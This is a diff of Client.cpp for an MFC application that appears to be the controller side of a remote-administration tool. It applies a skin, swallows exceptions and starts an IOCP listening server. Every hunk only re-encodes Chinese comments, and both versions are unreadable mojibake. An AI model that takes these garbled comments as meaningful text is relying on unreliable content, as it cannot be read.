@@ -1,4 +1,4 @@
-ï»¿// Client.cpp : Defines the class behaviors for the application.
+// Client.cpp : Defines the class behaviors for the application.
 //
 
 #include "stdafx.h"
@@ -9,7 +9,7 @@
 #include "TabView.h"
 #include "MainFrm.h"
 #include "SkinH.h"
-//#include "StartupDlg.h"//å¯åŠ¨ç”»é¢
+//#include "StartupDlg.h"//Æô¶¯»­Ãæ
 #pragma comment(lib, "SkinH.lib")
 #ifdef _DEBUG
 #define new DEBUG_NEW
@@ -44,7 +44,7 @@ void dbg_dump(struct _EXCEPTION_POINTERS* ExceptionInfo) {
 
 LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo) {
 	dbg_dump(ExceptionInfo);
-	// ä¸é€€å‡º
+	// ²»ÍË³ö
 	return true;
 	/*ExitProcess(0);*/
 }
@@ -75,7 +75,7 @@ DWORD CClientApp::GetRand()
 
 CClientApp::CClientApp()
 {
-	// åˆå§‹åŒ–æœ¬è¿›ç¨‹çš„å›¾åƒåˆ—è¡¨, ä¸ºåŠ è½½ç³»ç»Ÿå›¾æ ‡åˆ—è¡¨åšå‡†å¤‡
+	// ³õÊ¼»¯±¾½ø³ÌµÄÍ¼ÏñÁĞ±í, Îª¼ÓÔØÏµÍ³Í¼±êÁĞ±í×ö×¼±¸
 	typedef BOOL (WINAPI * pfn_FileIconInit) (BOOL fFullInit);
 	pfn_FileIconInit FileIconInit = (pfn_FileIconInit) GetProcAddress(LoadLibrary("shell32.dll"), (LPCSTR)660);
 	FileIconInit(TRUE);
@@ -127,7 +127,7 @@ BOOL CClientApp::InitInstance()
 				if (hRes != NULL)
 				{
 					SkinH_AttachRes((LPBYTE)hRes, SizeofResource(hinst,hResInfo), NULL, 0, 0, 0);
-					//SkinH_SetAero(FALSE);//é€æ˜ç‰¹æ•ˆå¼€å…³TRUE/FALSE
+					//SkinH_SetAero(FALSE);//Í¸Ã÷ÌØĞ§¿ª¹ØTRUE/FALSE
 					FreeResource(hRes);
 				}
 			}
@@ -138,7 +138,7 @@ BOOL CClientApp::InitInstance()
 			HANDLE	hFile = CreateFile("SkinH.dll", 0, 0, NULL, OPEN_EXISTING, 0, NULL);
 			if (hFile != INVALID_HANDLE_VALUE)
 			{
-				//SkinH_SetAero(TRUE);//Aeroé€æ˜ç‰¹æ•ˆ
+				//SkinH_SetAero(TRUE);//AeroÍ¸Ã÷ÌØĞ§
 				//SkinH_SetMenuAlpha(200);
 				SkinH_AttachEx(strSkinFile,NULL);
 			}
@@ -167,7 +167,7 @@ BOOL CClientApp::InitInstance()
 	Enable3dControlsStatic();	// Call this when linking to MFC statically
 #endif
 // 	CStartupDlg dlg;
-//     dlg.DoModal();   //å¯åŠ¨ç”»é¢
+//     dlg.DoModal();   //Æô¶¯»­Ãæ
 	/*****************************************************************************/
 	//(FuckTheCreaker)
 	
@@ -198,14 +198,14 @@ BOOL CClientApp::InitInstance()
 	if (!ProcessShellCommand(cmdInfo))
 		return FALSE;
 	
-	// å»æ‰èœå•æ 
+	// È¥µô²Ëµ¥À¸
 	//m_pMainWnd->SetMenu(NULL);
 	// The one and only window has been initialized, so show and update it.
 	
 	m_pMainWnd->ShowWindow(SW_SHOW);
 	m_pMainWnd->UpdateWindow();
 	
-	// å¯åŠ¨IOCPæœåŠ¡å™¨
+	// Æô¶¯IOCP·şÎñÆ÷
 	int	nPort = m_IniFile.GetInt("Settings", "ListenPort");
 	int	nMaxConnection = m_IniFile.GetInt("Settings", "MaxConnection");
 	if (nPort == 0)
